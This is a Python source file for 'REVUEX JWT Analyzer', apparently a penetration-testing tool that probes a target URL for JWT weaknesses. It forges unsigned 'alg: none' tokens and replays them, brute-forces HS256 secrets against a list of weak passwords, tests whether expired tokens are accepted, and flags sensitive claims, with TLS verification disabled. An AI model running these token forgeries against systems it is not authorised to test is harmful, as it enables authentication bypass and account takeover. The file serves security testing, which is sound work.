#!/usr/bin/env python3
"""
REVUEX - JWT Token Analyzer
Advanced JWT Security Testing & Exploitation

Author: G33L0
Telegram: @x0x0h33l0
"""

import requests
import json
import base64
import hmac
import hashlib
import time
from pathlib import Path
import re
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class JWTAnalyzer:
    """JWT token security analysis and exploitation"""

    def __init__(self, target, tokens, workspace, delay=2):
        self.target = target if target.startswith('http') else f"https://{target}"
        self.tokens = tokens if isinstance(tokens, list) else [tokens]
        self.workspace = Path(workspace)
        self.delay = delay
        self.headers = {'User-Agent': 'REVUEX-JWTAnalyzer/1.0'}
        
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'root', 'test', 'key', 
            'token', 'jwt', 'secret123', 'password123', 'qwerty', 'abc123',
            '1234567890', 'letmein', 'welcome', 'monkey', 'dragon', 'master'
        ]

    def analyze(self):
        vulnerabilities = []
        print(f"\n{'='*60}\n💎 REVUEX JWT Analyzer\n{'='*60}")

        for token in self.tokens:
            if not token or not self._is_jwt(token):
                continue

            print(f"→ Analyzing JWT: {token[:20]}...")
            jwt_data = self._decode_jwt(token)
            if not jwt_data: continue

            # Active Security Tests
            tests = [
                (self._test_none_algorithm, "None Algorithm"),
                (self._test_algorithm_confusion, "Alg Confusion"),
                (self._test_weak_secret, "Secret Brute-force"),
                (self._test_expiration, "Expiration Check"),
                (self._test_sensitive_data, "Sensitive Data")
            ]

            for test_func, name in tests:
                result = test_func(token, jwt_data)
                if result:
                    vulnerabilities.append(result)
                    print(f"   [!] Found: {name}")
                time.sleep(self.delay)

        self._save_results(vulnerabilities)
        return vulnerabilities

    def _is_jwt(self, token):
        return len(token.split('.')) == 3

    def _base64_encode(self, data):
        """Standard JWT URL-safe base64 encoding without padding"""
        if isinstance(data, dict):
            data = json.dumps(data).encode()
        return base64.urlsafe_b64encode(data).decode().replace('=', '')

    def _decode_jwt(self, token):
        try:
            header_b64, payload_b64, signature = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))
            return {'token': token, 'header': header, 'payload': payload, 'signature': signature}
        except: return None

    def _test_none_algorithm(self, token, jwt_data):
        """Exploit alg: 'none' vulnerability"""
        header = jwt_data['header'].copy()
        header['alg'] = 'none'
        
        # Variants: none, None, NONE, nOnE
        for alg_variant in ['none', 'None', 'NONE']:
            header['alg'] = alg_variant
            payload = jwt_data['payload']
            
            # Form unsigned token: header.payload.
            unsigned_token = f"{self._base64_encode(header)}.{self._base64_encode(payload)}."
            
            check = self._test_token(unsigned_token)
            if check and check['accepted']:
                return {
                    'type': 'JWT - None Algorithm Accepted',
                    'severity': 'critical',
                    'poc': unsigned_token,
                    'description': f"Server accepts tokens with 'alg': '{alg_variant}' and no signature."
                }
        return None

    def _test_weak_secret(self, token, jwt_data):
        """Brute-force HS256 secrets"""
        if jwt_data['header'].get('alg') != 'HS256':
            return None

        header_b64, payload_b64, actual_sig = token.split('.')
        signing_input = f"{header_b64}.{payload_b64}".encode()

        for secret in self.weak_secrets:
            expected_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            ).decode().replace('=', '')
            
            if expected_sig == actual_sig:
                return {
                    'type': 'JWT - Weak Secret Key',
                    'severity': 'critical',
                    'description': f"JWT signed with a weak secret: '{secret}'",
                    'remediation': "Use a cryptographically strong 256-bit random key."
                }
        return None

    def _test_algorithm_confusion(self, token, jwt_data):
        """Flag RS->HS confusion as INFORMATIONAL only.

        Using RS256 is not itself a vulnerability - the confusion attack only
        works if the backend can be tricked into verifying an HS256 signature
        with the RSA public key, which requires the public key and a live test.
        The old code reported this as a confirmed 'high' finding for every
        RS-signed token, a false positive. We emit an informational, manual-
        verification item instead."""
        if jwt_data['header'].get('alg') not in ['RS256', 'RS384', 'RS512']:
            return None

        return {
            'type': 'JWT - Algorithm Confusion (manual check)',
            'severity': 'info',
            'confidence': 'manual-verification-required',
            'description': ("Token uses an RSA algorithm. This is normal. IF the "
                            "server's public key is obtainable, test whether the "
                            "backend also accepts an HS256 token signed with that "
                            "public key as the HMAC secret."),
            'manual_step': "Resign the token with HS256 using the server's public key and check acceptance."
        }

    def _test_expiration(self, token, jwt_data):
        """Check if exp claim is present and valid"""
        exp = jwt_data['payload'].get('exp')
        if not exp:
            return {'type': 'JWT - Missing Expiration', 'severity': 'medium', 'description': 'Token has no expiration (exp) claim.'}
        
        if exp < time.time():
            # If server still accepts it, it's vulnerable
            check = self._test_token(token)
            if check and check['accepted']:
                return {'type': 'JWT - Expired Token Accepted', 'severity': 'high', 'description': 'Server accepts expired JWT tokens.'}
        return None

    def _test_sensitive_data(self, token, jwt_data):
        """Analyze payload for genuinely sensitive VALUES.

        The old check substring-matched 'admin', 'role', 'priv', 'root' against
        the whole payload JSON. A `role` claim (even `role: admin`) is completely
        normal in a JWT and is not a leak - this produced a 'medium' finding on
        almost every real token. We now look only for claim NAMES that imply a
        secret was embedded (passwords, secrets, private keys, raw card/SSN data),
        and ignore ordinary identity/authorization claims."""
        payload = jwt_data.get('payload', {})

        # Claim names that should never carry a secret value inside a JWT.
        secret_key_names = ['password', 'passwd', 'pwd', 'secret', 'api_key',
                            'apikey', 'private_key', 'privatekey', 'client_secret',
                            'ssn', 'credit_card', 'card_number', 'cvv', 'pin']

        found = []
        for key, value in self._iter_claims(payload):
            kl = key.lower()
            if any(s in kl for s in secret_key_names):
                found.append(key)
            # A PEM private key embedded as a value.
            elif isinstance(value, str) and 'BEGIN' in value and 'PRIVATE KEY' in value:
                found.append(key)

        if found:
            return {
                'type': 'JWT - Sensitive Data in Payload',
                'severity': 'medium',
                'description': 'JWT payload embeds secret-like claim(s). JWTs are '
                               'readable by anyone holding the token.',
                'found_claims': found,
            }
        return None

    def _iter_claims(self, obj, prefix=''):
        """Yield (key, value) pairs recursively from a claim object."""
        if isinstance(obj, dict):
            for k, v in obj.items():
                name = f"{prefix}.{k}" if prefix else str(k)
                if isinstance(v, (dict, list)):
                    yield from self._iter_claims(v, name)
                else:
                    yield name, v
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                yield from self._iter_claims(v, f"{prefix}[{i}]")

    def _test_token(self, token):
        """Decide whether a forged token is ACCEPTED, using a differential.

        A bare `status < 400` is not evidence: many endpoints return 200 for
        everyone (public page, SPA shell, login redirect). We compare the forged
        token against a deliberately-garbage token. The forged token is only
        'accepted' if it succeeds AND the garbage token is rejected (or returns
        clearly different content). That way a server that treats all tokens the
        same does not yield a false positive."""
        try:
            forged = self._auth_response(token)
            if forged is None:
                return None

            garbage = self._auth_response("invalid.invalid.invalid")
            forged_ok = forged.status_code < 400

            if garbage is None:
                # Cannot build a baseline; be conservative and report unaccepted.
                return {'accepted': False, 'status': forged.status_code,
                        'note': 'no baseline'}

            garbage_rejected = garbage.status_code >= 400
            content_differs = (forged.text != garbage.text and
                               abs(len(forged.text) - len(garbage.text)) > 50)

            accepted = forged_ok and (garbage_rejected or content_differs)
            return {
                'accepted': accepted,
                'status': forged.status_code,
                'baseline_status': garbage.status_code,
            }
        except Exception:
            return None

    def _auth_response(self, token):
        try:
            headers = self.headers.copy()
            headers['Authorization'] = f'Bearer {token}'
            return requests.get(self.target, headers=headers, timeout=5, verify=False)
        except Exception:
            return None

    def _save_results(self, vulnerabilities):
        jwt_dir = self.workspace / "jwt_analysis"
        jwt_dir.mkdir(exist_ok=True, parents=True)
        output_file = jwt_dir / "jwt_vulnerabilities.json"
        with open(output_file, 'w') as f:
            json.dump({'target': self.target, 'vulnerabilities': vulnerabilities}, f, indent=2)
        print(f"\n💾 Saved to: {output_file}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python jwt_analyzer.py <url> <token>")
        sys.exit(1)
    
    # Initialize with a dummy workspace for testing
    analyzer = JWTAnalyzer(sys.argv[1], sys.argv[2], Path("./revuex_workspace"))
    analyzer.analyze()
